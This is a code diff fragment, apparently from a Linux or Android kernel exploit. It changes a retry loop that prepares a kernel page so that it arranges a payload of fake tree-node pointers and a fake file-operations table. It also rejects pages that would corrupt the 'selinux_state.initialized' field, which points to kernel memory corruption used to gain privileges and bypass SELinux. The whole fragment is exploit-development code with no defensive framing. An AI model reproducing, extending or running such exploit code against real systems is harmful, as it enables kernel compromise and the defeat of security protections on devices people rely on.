+    uintptr_t base = prepare_kernel_page(request);
     if (base) {
-      pr_info("prepare_kernel_page ok attempt=%d +%lldms\n", attempt,
-              ms_since(&t_good));
-      return base;
+      PayloadWriteLayout layout = {
+        .parent = fake_parent,
+        .right = fake_right,
+        .left = fake_left,
+        .fops = fake_fops,
+      };
+      if (!payload_write_layout_matches_request(request, &layout)) {
+        pr_warning("payload arm mismatch preserve_child=%d right=%016zx\n",
+                   request->preserve_child, layout.right);
+      } else if (!payload_write_layout_accepts_page(request, &layout)) {
+        pr_warning("page %016zx stores an even byte over "
+                   "selinux_state.initialized; taking another\n", base);
+      } else {
+        pr_info("prepare_kernel_page ok attempt=%d +%lldms\n", attempt,
+                ms_since(&t_good));
+        return base;
+      }
     }
     struct timespec now;
     clock_gettime(CLOCK_MONOTONIC, &now);
-    if (now.tv_sec >= deadline.tv_sec) {
+    if (now.tv_sec > deadline.tv_sec ||
+        (now.tv_sec == deadline.tv_sec && now.tv_nsec >= deadline.tv_nsec)) {
       pr_warning("prepare_kernel_page timeout after %d attempts\n", attempt);
       break;
     }
